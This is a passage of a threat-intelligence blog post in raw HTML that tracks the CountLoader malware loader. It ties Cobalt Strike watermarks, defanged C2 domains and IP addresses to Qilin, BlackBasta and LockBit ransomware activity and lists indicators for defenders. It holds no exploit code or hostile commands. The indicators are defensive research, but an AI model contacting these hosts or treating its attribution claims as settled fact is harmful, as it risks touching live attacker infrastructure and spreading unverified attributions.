+<p class="wp-block-paragraph">Sample 1 was found on August 29, 2024, and we made use of the domain fronting technique via CloudFront, with the configured domain being:</p>
+
+
+
+<p class="wp-block-paragraph"><code>d31tef3bsujkft[.]cloudfront[.]net/safebrowsing/rd/CltOb12nLW1</code><br><code>IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2</code></p>
+
+
+
+<p class="wp-block-paragraph">The second sample we found was named <em><strong>svchost[.]exe</strong></em> and is available <a href="https://www.virustotal.com/gui/file/f22482bf85b0f01293b42174b3720fb226bdda49720130a1aa026fa18dfa6fa0/details">on VirusTotal</a>.</p>
+
+
+
+<p class="wp-block-paragraph">It was first observed on June 20, 2025, and configured with the C2 domain:</p>
+
+
+
+<p class="wp-block-paragraph"><code>quasuar[.]com</code></p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="809" height="1231" src="https://www.silentpush.com/wp-content/uploads/cloader-image-16-2nd-sample-w-c2-domain.png" alt="The second sample was configured with the C2 domain" class="wp-image-13907"/><figcaption class="wp-element-caption"><em>The second sample was configured with the C2 domain</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">The only observed IP associated with the <em><strong>quasuar[.]com</strong></em> domain is <em>45.61.150[.]76</em>, which we enriched in our platform to tie back to several hostnames.</p>
+
+
+
+<p class="wp-block-paragraph">Looking further into the domain, <em><strong>quasuar[.]com</strong></em> tied to that IP, our team found an X/Twitter Post by a security researcher, <a href="https://x.com/1ZRR4H/status/1940836465488925148/">Germán Fernández</a>, who referenced both the domain and the very same Cobalt Strike watermark we were tracking: “<strong>1473793097</strong>.”</p>
+
+
+
+<p class="wp-block-paragraph">In this post, Fernández presents evidence that ties the watermark to yet another Cobalt Strike watermark: “<strong>1357776117</strong>,” using the following screenshot:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1373" height="886" src="https://www.silentpush.com/wp-content/uploads/cloader-image-17-fernandez-shared.jpg" alt="Screenshot shared by security researcher Fernández" class="wp-image-13908"/><figcaption class="wp-element-caption"><em>Screenshot shared by security researcher Fernández</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">Our team then observed a Cobalt Strike C2 profile using both the watermark and the <em><strong>quasuar[.]com</strong></em> C2 domain and an OVH server that hosted the domain <em><strong>misctoolsupdate[.]com</strong></em>. The IP in question, <em><strong>180.131.145[.]73</strong>,</em> is also noted in Fernández’s X/Twitter post.</p>
+
+
+
+<p class="wp-block-paragraph">Fernández further states that the watermark <em><strong>1473793097</strong></em> observed in the sample is linked to a Qilin ransomware incident, while the watermark <em><strong>1357776117</strong></em> is associated with both BlackBasta and Qilin.</p>
+
+
+
+<p class="wp-block-paragraph">To corroborate this information, we worked to find additional links between the C2 server IP address <em><strong>45.61.150[.]76</strong></em> and the IP address <em><strong>180.131.145[.]73</strong></em> seen in the X/Twitter post.</p>
+
+
+
+<p class="wp-block-paragraph">While doing so, we discovered that, within two days of scanning, our database had observed the same SSL fingerprint for both IP addresses.</p>
+
+
+
+<p class="wp-block-paragraph">Our team also found an interesting pattern in the subdomain naming scheme for both <em><strong>misctoolsupdate[.]com</strong></em> and <em><strong>limenlinon[.]com</strong>,</em> where the attacker created “sso” and “login” subdomains for both apex domains.</p>
+
+
+
+<h3 class="wp-block-heading" id="h-further-analysis">Further Analysis</h3>
+
+
+
+<p class="wp-block-paragraph">Further analysis confirmed that the domain <em><strong>misctoolsupdate[.]com</strong></em> has been observed as a Cobalt Strike C2 domain. An example of such was configured using the second watermark, <em><strong>1357776117</strong></em>, which can be found <a href="https://www.virustotal.com/gui/file/9151b7f665617c304f82d1ef422cd44f8da01d3524967d7ad70d72a43ba3a268/behavior">on VirusTotal</a>.</p>
+
+
+
+<p class="wp-block-paragraph">By combining all the information, our team was able to create a technical fingerprint based on the custom “500: Internal Server Error” response tied to this particular attack cluster. Note that this response is only given when querying the IP directly, which is why the query only returns IP addresses. Examining the IP’s SSL certificates then reveals the associated domains.</p>
+
+
+
+<p class="wp-block-paragraph">Notable examples with the Cobalt Strike <em><strong>1357776117</strong></em> watermark discovered via this fingerprint include:</p>
+
+
+
+<ul class="wp-block-list">
+<li><em>grouptelecoms[.]com</em> (162.220.61[.]172)</li>
+
+
+
+<li><em>limenlinon[.]com</em> (45.61.150[.]76)</li>
+
+
+
+<li><em>misctoolsupdate[.]com</em> (180.131.145[.]73)</li>
+
+
+
+<li><em>officetoolservices[.]com</em> (88.119.174[.]107)</li>
+
+
+
+<li><em>onlinenetworkupdate[.]com</em> (184.174.96[.]67)</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><em>Note: The IP addresses <strong>45.61.150[.]76</strong> and <strong>180.131.145[.]73</strong> are both observed to be connected via this fingerprint, further linking the Cobalt Strike watermarks <strong>1357776117</strong> and <strong>1473793097</strong> together.</em></p>
+
+
+
+<p class="wp-block-paragraph">While we are among the first to highlight the attribution of the new watermark, <em><strong>1473793097</strong></em>, to this attack cluster, reviewing open source for the older watermark, <em><strong>1357776117</strong></em>, yields a wide range of ransomware-related research articles.</p>
+
+
+
+<p class="wp-block-paragraph">One of the most significant among them is a <a href="https://research.kudelskisecurity.com/2025/07/14/adversary-infrastructure-and-indicators-behind-the-sap-netweaver-0-day-exploitation/">report by Kudelski Security</a>, which mentions the domain <em><strong>misctoolsupdate[.]com</strong></em> and the watermark <em><strong>1357776117</strong></em> in relation to attacks on SAP NetWeaver.</p>
+
+
+
+<p class="wp-block-paragraph">Details from the article align with our findings:</p>
+
+
+
+<p class="wp-block-paragraph"><code>Observation of the adversary’s infrastructure showed consistent naming conventions across multiple domains and subdomains. The attacker repeatedly used prefixes such as “sso.” and “login.” likely in an attempt to blend malicious traffic into legitimate enterprise communications. Examples include: (login| sso).misctoolsupdate[.]com (login| sso).networkmaintenanceservice[.]com (login|sso).officetoolservices[.]com sso.leapsummergetis[.]com The recurrence of these prefixes across unrelated domains suggests automated infrastructure generation, possibly using templated scripts or orchestration tooling to rapidly deploy new redirectors or C2 servers with plausible, enterprise-looking subdomains.</code></p>
+
+
+
+<p class="wp-block-paragraph">The article ties the observed Cobalt Strike watermark (and, by extension, the CountLoader campaign we have been tracking) directly to BlackBasta and Qilin Ransomware activity.</p>
+
+
+
+<h3 class="wp-block-heading" id="h-additional-external-research">Additional External Research</h3>
+
+
+
+<p class="wp-block-paragraph">Additional external research on this specific watermark can be found here:</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://op-c.net/blog/sap-cve-2025-31324-qilin-breach/">https://op-c.net/blog/sap-cve-2025-31324-qilin-breach/</a></li>
+
+
+
+<li><a href="https://medium.com/@Intel_Ops/hunting-black-bastas-cobalt-strike-96a81a6ea781">https://medium.com/@Intel_Ops/hunting-black-bastas-cobalt-strike-96a81a6ea781</a></li>
+
+
+
+<li><a href="https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/">https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/</a></li>
+
+
+
+<li><a href="https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/">https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/</a></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">An interesting finding from the above on LockBit comes from the <a href="https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/">DFIR report</a>: “<em>The attacker used the Windows Music folder as a central staging server. This staging folder is not commonly used for malware staging. Threat actors usually store malware in folders such as ‘tmp&#8217; or &#8216;appdata</em>.’”</p>
+
+
+
+<p class="wp-block-paragraph">This aligns with our observations regarding CountLoader staging samples in the “Music” folder.</p>
+
+
+
+<p class="wp-block-paragraph">Based on all of the above, our team assesses with high confidence that CountLoader serves either as an IAB or ransomware affiliate and has apparent connections to the LockBit, BlackBasta, and Qilin ransomware groups.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Mitigation">Mitigation</h2>
+
+
+
+<p class="wp-block-paragraph">Silent Push believes all observables associated with CountLoader present a significant level of risk. Proactive measures are essential to defend against Initial Access Brokers, as the damage that follows is typically far greater than first observed (if any).</p>
+
+
+
+<p class="wp-block-paragraph">Our analysts have constructed several Silent Push Indicators Of Future Attack™ (IOFA™) Feeds for our clients to protect them from this threat. These feeds include:</p>
+
+
+
+<ul class="wp-block-list">
+<li>CountLoader Domains</li>
+
+
+
+<li>Cobalt Strike IPs</li>
+
+
+
+<li>Cobalt Strike Domains</li>
+
+
+
+<li>Adaptix C2 IPs</li>
+
+
+
+<li>Adaptix C2 Domains</li>
+
+
+
+<li>Lumma Infostealer C2 Domains</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The IOFA™ Feeds are available as part of a Silent Push Enterprise subscription. Enterprise users can ingest this data into their security stack to inform their detection protocols or use it to pivot across attacker infrastructure using the Silent Push Console and Feed Analytics screen.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Sample-CountLoader-Indicators-Of-Future-Attack™-(IOFA™)-List">Sample CountLoader Indicators Of Future Attack™ (IOFA™) List</h2>
+
+
+
+<p class="wp-block-paragraph">Below is a sample list of Silent Push IOFA™ associated with CountLoader. Our complete list is available for enterprise users.</p>
+
+
+
+<ul class="wp-block-list">
+<li><em>app-updater[.]app</em></li>
+
+
+
+<li><em>app-updater1[.]app</em></li>
+
+
+
+<li><em>app-updater2[.]app</em></li>
+
+
+
+<li><em>grouptelecoms[.]com</em></li>
+
+
+
+<li><em>limenlinon[.]com</em></li>
+
+
+
+<li><em>misctoolsupdate[.]com</em></li>
+
+
+
+<li><em>ms-team-ping2[.]com</em></li>
+
+
+
+<li><em>officetoolservices[.]com</em></li>
+
+
+
+<li><em>onlinenetworkupdate[.]com</em></li>
+
+
+
+<li><em>quasuar[.]com</em></li>
+</ul>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Continuing-to-Track-CountLoader">Continuing to Track CountLoader Malware Loader</h2>
+
+
+
+<p class="wp-block-paragraph">We believe that the threat posed by CountLoader continues to evolve by the day and advise all enterprise organizations that detect CountLoader activity to immediately begin deeper investigations and monitor for the release of additional payloads and exploitation.</p>
+
+
+
+<p class="wp-block-paragraph">If you or your organization has any leads related to this effort, particularly regarding unique payloads or new C2s used by these threat actors, our team would love to hear from you.</p>
+				<div class="single-post-footer">
+										
+					
+					<div class="single-post-footer">
+						<a href="https://www.silentpush.com/blog/" class="avia-button av-animated-generic bottom-to-top avia-icon_select-yes-left-icon avia-style-link avia-color-default avia-size-medium avia-position-no-align avia_start_delayed_animation">
+							<span class="avia_button_icon avia_button_icon_left " aria-hidden="true" data-av_icon="" data-av_iconfont="silent-push-icons"></span>
+							<span class="avia_iconbox_title">Back to Blog</span>
+						</a>
+                        <div class="single-social-share"><a href="https://twitter.com/silentpush"><span></span></a></div>
+					</div>
+
+				</div>
+			</div>
+        </div>
+	</div>
+</div>
+
+<div class="avia-section main_color related-posts-section">
+	<div class="container">
+		<div class="content">
+			<div class="ep-columns related-posts-header">
+				<div class="ep-columns-inner">
+					<div class="ep-column">
+						<div class="h4">
+							<div class="av-special-heading-tag">Related Post</div>
+						</div>
+					</div>
+					<div class="ep-column">
+						<a href="https://www.silentpush.com/blog/" class="avia-button avia-icon_select-no avia-style-outline avia-color-link avia-size-large avia-position-left">
+							<span class="avia_iconbox_title">Read More</span>
+						</a>
+					</div>
+				</div>
+			</div>
+		<div  class='ep-posts-grid-container ep-grid-wrapper ep-space-small  postsgrid--related'  ><div class='ep-posts-grid ep-grid  facetwp-template ep-grid-columns  is-variable  '><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-third-tablet one-third  entry entry-17558 entry-post   ep-item-has-button  blog ">
+    <div class="ep-item-inner   ">
+                <div class="ep-item-contents">
+                        <div class="ep-post-terms">
+                                    <a class='ep-item-term ep-item-term-blog' href='https://www.silentpush.com/blog/' >Blog</a>                            </div>
+                                    <div class="ep-item-title-wrapper ">
+            <h4 class="ep-item-title av-special-heading-tag" >
+                                    <a href="https://www.silentpush.com/blog/fast-flux-phishing/"  >
+                                        Silent Push Tracks a Mass Phishing Operation Through Fast Flux                                    </a>
+                            </h4>
+            </div>
+                                                    <div class="ep-post-meta">
+                    <div class="ep-post-date">
+                        September 15, 2026                    </div>
+                </div>
+                                        <div class="ep-item-button-wrapper">
+                    <a href="https://www.silentpush.com/blog/fast-flux-phishing/"  class="avia-button avia-style-outline avia-color-theme-color avia-size-small"><span class="avia_iconbox_title">News Source</span></a>
+                </div>
+                    </div>
+    </div>
+</div><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-third-tablet one-third  entry entry-17539 entry-post   ep-item-has-button  blog ">
+    <div class="ep-item-inner   ">
+                <div class="ep-item-contents">
+                        <div class="ep-post-terms">
+                                    <a class='ep-item-term ep-item-term-blog' href='https://www.silentpush.com/blog/' >Blog</a>                            </div>
+                                    <div class="ep-item-title-wrapper ">
+            <h4 class="ep-item-title av-special-heading-tag" >
+                                    <a href="https://www.silentpush.com/blog/nk-it-worker/"  >
+                                        Silent Push Exposes North Korean IT Worker Recruiting Facilitators Through Discord Servers                                    </a>
+                            </h4>
+            </div>
+                                                    <div class="ep-post-meta">
+                    <div class="ep-post-date">
+                        September 14, 2026                    </div>
+                </div>
+                                        <div class="ep-item-button-wrapper">
+                    <a href="https://www.silentpush.com/blog/nk-it-worker/"  class="avia-button avia-style-outline avia-color-theme-color avia-size-small"><span class="avia_iconbox_title">News Source</span></a>
+                </div>
+                    </div>
+    </div>
+</div><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-third-tablet one-third  entry entry-17290 entry-post   ep-item-has-button  blog ">
+    <div class="ep-item-inner   ">
+                <div class="ep-item-contents">
+                        <div class="ep-post-terms">
+                                    <a class='ep-item-term ep-item-term-blog' href='https://www.silentpush.com/blog/' >Blog</a>                            </div>
+                                    <div class="ep-item-title-wrapper ">
+            <h4 class="ep-item-title av-special-heading-tag" >
+                                    <a href="https://www.silentpush.com/blog/peer2profit-astroproxy/"  >
+                                        How Peer2Profit and Astroproxy Turn Your Bandwidth Into Someone Else's Product                                    </a>
+                            </h4>
+            </div>
+                                                    <div class="ep-post-meta">
+                    <div class="ep-post-date">
+                        August 20, 2026                    </div>
+                </div>
+                                        <div class="ep-item-button-wrapper">
+                    <a href="https://www.silentpush.com/blog/peer2profit-astroproxy/"  class="avia-button avia-style-outline avia-color-theme-color avia-size-small"><span class="avia_iconbox_title">News Source</span></a>
+                </div>
+                    </div>
+    </div>
+</div></div></div>		</div>
+	</div>
+</div>
+
+<div class="footer-page-content footer_color" id="footer-page"><div id='av_section_1'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-0  avia-builder-el-first  footer-section footer-section    container_wrap fullsize' style='  '   data-lazy-css='https://www.silentpush.com/wp-content/themes/silentpush/assets/css/footer.css?21'><div class='container' ><main  class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-13877'><div class='entry-content-wrapper clearfix'>
+<div   class='ep-columns ep-space-top-none ep-space-bottom-mini avia-full-stretch align-top footer--menu-row  ep-columns-1 '   ><div class='ep-columns-inner'><div  class="ep-column one-sixth   first  avia-builder-el-1  avia-builder-el-first  only-menu-heading  " ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-2  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-platform" class="menu" role="menu"><li role="menuitem" id="menu-item-10618" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Platform</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-14171" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/platform/" tabindex="0"><span class="avia-menu-text">Overview</span></a></li>
+	<li role="menuitem" id="menu-item-668" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	<li role="menuitem" id="menu-item-669" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/brand-protection/" tabindex="0"><span class="avia-menu-text">Brand Protection</span></a></li>
+	<li role="menuitem" id="menu-item-667" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/automated-intelligence/" tabindex="0"><span class="avia-menu-text">Automated Intelligence</span></a></li>
+	<li role="menuitem" id="menu-item-9808" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/intelligence-on-demand/" tabindex="0"><span class="avia-menu-text">Intelligence On-Demand</span></a></li>
+	<li role="menuitem" id="menu-item-670" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/api/" tabindex="0"><span class="avia-menu-text">API</span></a></li>
+	<li role="menuitem" id="menu-item-8579" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/integrations/" tabindex="0"><span class="avia-menu-text">Integrations</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-sixth     avia-builder-el-3  only-menu-heading  " ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-4  avia-builder-el-first  '>
+					<ul id="menu-footer-company" class="menu" role="menu"><li role="menuitem" id="menu-item-10619" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-13822" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/" tabindex="0"><span class="avia-menu-text">Company</span></a></li>
+	<li role="menuitem" id="menu-item-676" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/team/" tabindex="0"><span class="avia-menu-text">Leadership Team</span></a></li>
+	<li role="menuitem" id="menu-item-13224" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/news/" tabindex="0"><span class="avia-menu-text">News</span></a></li>
+	<li role="menuitem" id="menu-item-678" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/partners/" tabindex="0"><span class="avia-menu-text">Partners</span></a></li>
+	<li role="menuitem" id="menu-item-679" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+</ul>				</div>
+				
+				<div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-5  avia-builder-el-last  '>
+					<ul id="menu-footer-solutions" class="menu" role="menu"><li role="menuitem" id="menu-item-1302" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/" tabindex="0"><span class="avia-menu-text">Solutions</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12894" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-silent-push-difference/" tabindex="0"><span class="avia-menu-text">The Silent Push Difference</span></a></li>
+	<li role="menuitem" id="menu-item-13034" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/industries/" tabindex="0"><span class="avia-menu-text">Industries</span></a></li>
+	<li role="menuitem" id="menu-item-11231" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/use-cases/" tabindex="0"><span class="avia-menu-text">Use Cases</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-sixth     avia-builder-el-6  only-menu-heading  " ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-7  avia-builder-el-first  '>
+					<ul id="menu-footer-resources" class="menu" role="menu"><li role="menuitem" id="menu-item-680" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/resources/" tabindex="0"><span class="avia-menu-text">Resources</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-681" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+	<li role="menuitem" id="menu-item-11627" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/reports-and-white-papers/" tabindex="0"><span class="avia-menu-text">Reports and White Papers</span></a></li>
+	<li role="menuitem" id="menu-item-3239" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/webinars-workshops/" tabindex="0"><span class="avia-menu-text">Webinars and Workshops</span></a></li>
+	<li role="menuitem" id="menu-item-682" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/videos/" tabindex="0"><span class="avia-menu-text">Videos</span></a></li>
+</ul>
+</li>
+</ul>				</div>
+				
+				<div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-8  avia-builder-el-last  '>
+					<ul id="menu-footer-research" class="menu" role="menu"><li role="menuitem" id="menu-item-12685" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/research-hub/" tabindex="0"><span class="avia-menu-text">Research</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12686" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/research-hub/" tabindex="0"><span class="avia-menu-text">Research Hub</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fourth     avia-builder-el-9  only-menu-button  " ><div class="ep-column-inner" ><div><div  class='avia-button-wrap avia-button-left ep-space-mini    avia-builder-el-10  avia-builder-el-first  '  ><a href='https://www.silentpush.com/book-a-demo/'  class='avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-orange avia-color-default avia-size-large avia-position-left'  target="_blank"   ><span class='avia_iconbox_title' >Book A Demo</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div>
+<div  class='avia-button-wrap avia-button-left ep-space-mini    avia-builder-el-11  '  ><a href='https://www.silentpush.com/contact/'  class='avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-blue avia-color-default avia-size-large avia-position-left'  target="_blank"   ><span class='avia_iconbox_title' >Contact Us</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div>
+<div  class='avia-button-wrap avia-button-left ep-space-top-mini ep-space-bottom-none    avia-builder-el-12  '  ><a href='https://www.silentpush.com/community-edition/'  class='avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-orange avia-color-default avia-size-large avia-position-left'  target="_blank"   ><span class='avia_iconbox_title' >Community Edition</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div>
+<div  class='avia-button-wrap avia-button-left ep-space-top-mini ep-space-bottom-none    avia-builder-el-13  avia-builder-el-last  '  ><a href="https://partner.silentpush.com/portal" class="avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-blue avia-color-default avia-size-large avia-position-left" target="_blank" rel="noopener"><span class='avia_iconbox_title' >Partner Portal</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div></div></div></div><div  class="ep-column one-fourth     avia-builder-el-14  only-menu-heading only-menu-button  " ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-15  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-login" class="menu" role="menu"><li role="menuitem" id="menu-item-1288" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Login</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-1437" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://explore.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Community Edition</span></a></li>
+	<li role="menuitem" id="menu-item-1293" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://app.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Enterprise</span></a></li>
+	<li role="menuitem" id="menu-item-11440" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://partner.silentpush.com/portal" tabindex="0"><span class="avia-menu-text">Partner Portal</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-none avia-full-stretch align-middle footer--logo-row  ep-break-at-tablet ep-columns-2 '   ><div class='ep-columns-inner'><div  class="ep-column one-full   first  avia-builder-el-16  avia-builder-el-last   column-top-margin" ><div class="ep-column-inner" style='padding:60px 0 0px 0 ; '><div><div  class='avia-image-container ep-flex  ep-space-top-large ep-space-bottom-small     avia-builder-el-17  avia-builder-el-no-sibling   ep-align-left'  ><div class='avia-image-container-inner' style='max-width:40px; '><div class='avia-image-overlay-wrap'><img decoding="async" loading='lazy' class='wp-image-8677 avia-img-lazy-loading-8677 avia_image' src="https://www.silentpush.com/wp-content/uploads/FAVICON-1.png" alt='' title='FAVICON' height="1080" width="1080"  /></div></div></div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --></div></div></main><!-- close content main element --></div></div><div id='av_section_2'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-18  avia-builder-el-last  footer-section footer-section-mobile footer-section   container_wrap fullsize' style='  '   data-lazy-css='https://www.silentpush.com/wp-content/themes/silentpush/assets/css/footer.css?21'><div class='container' ><div class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-13877'><div class='entry-content-wrapper clearfix'>
+<div   class='ep-columns ep-space-small avia-full-stretch align-top   ep-columns-3 '   ><div class='ep-columns-inner'><div  class="ep-column one-half  no-margins-on-breakpoint  first  avia-builder-el-19  avia-builder-el-first   " ><div class="ep-column-inner" ><div><div class="avia_textblock ep-text   avia-builder-el-20  avia-builder-el-no-sibling   av-animated-generic bottom-to-top ep-space-small  ep-align-right  ep-align-mobile-left "   style='font-size:14px; '><p><a href="/responsible-disclosure/">Vulnerability Disclosure Policy</a> | <a href="/terms-of-use/">Terms of Service</a> | <a href="/privacy-policy">Privacy Policy</a></p>
+</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-small avia-full-stretch align-middle footer--logo-row  ep-break-at-tablet ep-columns-4 '   ><div class='ep-columns-inner'><div  class="ep-column one-full   first  avia-builder-el-21   column-top-margin" ><div class="ep-column-inner" ><div><section class="avia_codeblock_section  avia_code_block_0" ><div class='avia_codeblock ' >	<a href="https://www.silentpush.com" class="logo logo-type-image" aria-label="Silent Push Logo">
+		<div class='logo-main'><img width="502" height="88" src="https://www.silentpush.com/wp-content/uploads/Silent-Push-Logo-@2x.png" class="avia-img-lazy-loading-1201 attachment-full size-full" alt="Silent Push logo" decoding="async" loading="lazy" /></div><div class='logo-alternate'><img width="971" height="168" src="https://www.silentpush.com/wp-content/uploads/Silent-Push-Logo-Alternate@2x.png" class="avia-img-lazy-loading-1209 attachment-full size-full" alt="Silent Push logo" decoding="async" loading="lazy" /></div>    </a>
+	</div></section></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-small avia-full-stretch align-top footer--menu-row  ep-columns-5 '   ><div class='ep-columns-inner'><div  class="ep-column one-fifth   first  avia-builder-el-23  only-menu-heading  column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-24  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-platform-1" class="menu" role="menu"><li role="menuitem" id="menu-item-10618" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Platform</span></span>
+
+
+<ul role="menu" class="sub-menu">
